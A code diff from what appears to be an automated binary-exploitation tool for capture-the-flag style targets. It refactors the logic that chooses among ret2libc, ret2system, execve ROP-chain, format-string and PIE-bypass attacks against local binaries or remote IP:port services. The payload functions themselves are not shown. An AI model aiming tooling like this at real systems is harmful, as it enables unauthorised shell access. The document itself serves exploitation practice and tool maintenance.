@@ -3136,10 +3136,20 @@ Examples:
     print_info("scanning PLT functions")
     function_addresses = scan_plt_functions(program)
     function_flags = set_function_flags(function_addresses)
-    
-    # Set global function flags
-    for func, available in function_flags.items():
-        globals()[func] = available
+
+    # P4.8: set ctx.has_* booleans instead of injecting into globals().
+    # P4.7 replaces the 22 `globals().get(...)` reads below with `ctx.has_X`
+    # — both ends of the data flow now route through ExploitContext, ending
+    # the implicit global state that has been the v3.1 single biggest
+    # architecture smell (refactor.md §1.3 #2).  `function_flags` still
+    # feeds the legacy code path (function_addresses is used elsewhere);
+    # only the global injection is retired.
+    ctx.has_write = bool(function_flags.get("write"))
+    ctx.has_puts = bool(function_flags.get("puts"))
+    ctx.has_printf = bool(function_flags.get("printf"))
+    ctx.has_system = bool(function_flags.get("system"))
+    ctx.has_backdoor = bool(function_flags.get("backdoor"))
+    ctx.has_callsystem = bool(function_flags.get("callsystem"))
     
     print_section_header("ROP GADGET DISCOVERY")
     
@@ -3221,7 +3231,7 @@ Examples:
                 if args.ip and args.port:
                     print_section_header("REMOTE EXPLOITATION")
                     print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
-                    if globals().get('system', 0) == 1 and bin_sh == 1:
+                    if ctx.has_system and bin_sh == 1:
                         if bit_arch == 32:
                             ret2_system_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                             sys.exit(0)
@@ -3229,7 +3239,7 @@ Examples:
                             ret2_system_x64_canary_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,args.ip,args.port,c,diff)
                             sys.exit(0)
                     
-                    if globals().get('puts', 0) == 1:
+                    if ctx.has_puts:
                         if bit_arch == 32:
                             ret2libc_put_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                             sys.exit(0)
@@ -3237,7 +3247,7 @@ Examples:
                             ret2libc_put_x64_canary_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,args.ip,args.port,c,diff)
                             sys.exit(0)
                     
-                    if globals().get('write', 0) == 1:
+                    if ctx.has_write:
                         if bit_arch == 32:
                             ret2libc_write_x32_canary_remote(program,libc,padding,args.ip,args.port,c,diff)
                             sys.exit(0)
@@ -3246,13 +3256,13 @@ Examples:
                             sys.exit(0)
                     
                     if bit_arch == 32:
-                        if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
+                        if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
                             execve_syscall_canary_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,args.ip,args.port,c,diff)
                             sys.exit(0)
                 else:
                     print_section_header("LOCAL EXPLOITATION")
                     print_info("executing local binary exploitation")
-                    if globals().get('system', 0) == 1 and bin_sh == 1:
+                    if ctx.has_system and bin_sh == 1:
                         if bit_arch == 32:
                             ret2_system_canary_x32(program,libc,padding,libc_path,c,diff)
                             sys.exit(0)
@@ -3260,7 +3270,7 @@ Examples:
                             ret2_system_canary_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path,c,diff)
                             sys.exit(0)
                     
-                    if globals().get('puts', 0) == 1:
+                    if ctx.has_puts:
                         if bit_arch == 32:
                             ret2libc_put_canary_x32(program,libc,libc_path,padding,c,diff)
                             sys.exit(0)
@@ -3268,7 +3278,7 @@ Examples:
                             ret2libc_put_canary_x64(program,libc,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path,padding,c,diff)
                             sys.exit(0)
                     
-                    if globals().get('write', 0) == 1:
+                    if ctx.has_write:
                         if bit_arch == 32:
                             ret2libc_write_canary_x32(program,libc,padding,libc_path,c,diff)
                             sys.exit(0)
@@ -3277,7 +3287,7 @@ Examples:
                             sys.exit(0)
                     
                     if bit_arch == 32:
-                        if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
+                        if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
                             execve_canary_syscall(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,c,diff)
                             sys.exit(0)
                 
@@ -3317,7 +3327,7 @@ Examples:
         if args.ip and args.port:
             print_section_header("REMOTE FORMAT STRING EXPLOITATION")
             print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
-            if globals().get('system', 0) == 1 and bin_sh == 1:
+            if ctx.has_system and bin_sh == 1:
                 print_info('attempting to leak program strings via format string')
                 fmtstr_print_strings_remote(program, args.ip, args.port)
                 try:
@@ -3338,7 +3348,7 @@ Examples:
         else:
             print_section_header("LOCAL FORMAT STRING EXPLOITATION")
             print_info("executing local format string exploitation")
-            if globals().get('system', 0) == 1 and bin_sh == 1:
+            if ctx.has_system and bin_sh == 1:
                 print_info('attempting to leak program strings via format string')
                 fmtstr_print_strings(program)
                 try:
@@ -3360,13 +3370,13 @@ Examples:
         if args.ip and args.port:
             print_section_header("REMOTE STACK OVERFLOW EXPLOITATION")
             print_info(f"targeting remote service at {Colors.YELLOW}{args.ip}:{args.port}{Colors.END}")
-            if pie_enabled == 1 and globals().get('backdoor', 0) == 1:
+            if pie_enabled == 1 and ctx.has_backdoor:
                 print_warning("PIE protection detected, but backdoor function available")
                 print_info("initiating PIE bypass via backdoor function brute force")
-                pie_backdoor_exploit_remote(program, padding, globals().get('backdoor', 0), libc_path, libc, args.ip, args.port, globals().get('callsystem', 0))
+                pie_backdoor_exploit_remote(program, padding, ctx.has_backdoor, libc_path, libc, args.ip, args.port, ctx.has_callsystem)
                 sys.exit(0)
             
-            if globals().get('system', 0) == 1 and bin_sh == 1:
+            if ctx.has_system and bin_sh == 1:
                 if bit_arch == 32:
                     ret2_system_x32_remote(program, libc, padding, args.ip, args.port)
                     sys.exit(0)
@@ -3374,7 +3384,7 @@ Examples:
                     ret2_system_x64_remote(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, args.ip, args.port)
                     sys.exit(0)
             
-            if globals().get('write', 0) == 1:
+            if ctx.has_write:
                 if bit_arch == 32:
                     ret2libc_write_x32_remote(program, libc, padding, args.ip, args.port)
                     sys.exit(0)
@@ -3382,7 +3392,7 @@ Examples:
                     ret2libc_write_x64_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, args.ip, args.port)
                     sys.exit(0)
             
-            if globals().get('puts', 0) == 1:
+            if ctx.has_puts:
                 if bit_arch == 32:
                     ret2libc_put_x32_remote(program, libc, padding, args.ip, args.port)
                     sys.exit(0)
@@ -3403,19 +3413,19 @@ Examples:
                         sys.exit(0)
             
             if bit_arch == 32:
-                if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
+                if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
                     execve_syscall_remote(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80, args.ip, args.port)
                     sys.exit(0)
         else:
             print_section_header("LOCAL STACK OVERFLOW EXPLOITATION")
             print_info("executing local stack overflow exploitation")
-            if pie_enabled == 1 and globals().get('backdoor', 0) == 1:
+            if pie_enabled == 1 and ctx.has_backdoor:
                 print_warning("PIE protection detected, but backdoor function available")
                 print_info("initiating PIE bypass via backdoor function brute force")
-                pie_backdoor_exploit(program, padding, globals().get('backdoor', 0), libc_path, libc, globals().get('callsystem', 0))
+                pie_backdoor_exploit(program, padding, ctx.has_backdoor, libc_path, libc, ctx.has_callsystem)
                 sys.exit(0)
             
-            if globals().get('system', 0) == 1 and bin_sh == 1:
+            if ctx.has_system and bin_sh == 1:
                 if bit_arch == 32:
                     ret2_system_x32(program, libc, padding, libc_path)
                     sys.exit(0)
@@ -3423,7 +3433,7 @@ Examples:
                     ret2_system_x64(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, libc_path)
                     sys.exit(0)
             
-            if globals().get('write', 0) == 1:
+            if ctx.has_write:
                 if bit_arch == 32:
                     ret2libc_write_x32(program, libc, padding, libc_path)
                     sys.exit(0)
@@ -3431,7 +3441,7 @@ Examples:
                     ret2libc_write_x64(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, libc_path)
                     sys.exit(0)
             
-            if globals().get('puts', 0) == 1:
+            if ctx.has_puts:
                 if bit_arch == 32:
                     ret2libc_put_x32(program, libc, padding, libc_path)
                     sys.exit(0)
@@ -3452,7 +3462,7 @@ Examples:
                         sys.exit(0)
             
             if bit_arch == 32:
-                if bin_sh == 1 and globals().get('eax', 0) == 1 and globals().get('ebx', 0) == 1 and globals().get('ecx', 0) == 1 and globals().get('edx', 0) == 1:
+                if bin_sh == 1 and eax == 1 and ebx == 1 and ecx == 1 and edx == 1:
                     execve_syscall(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80)
                     sys.exit(0)
 
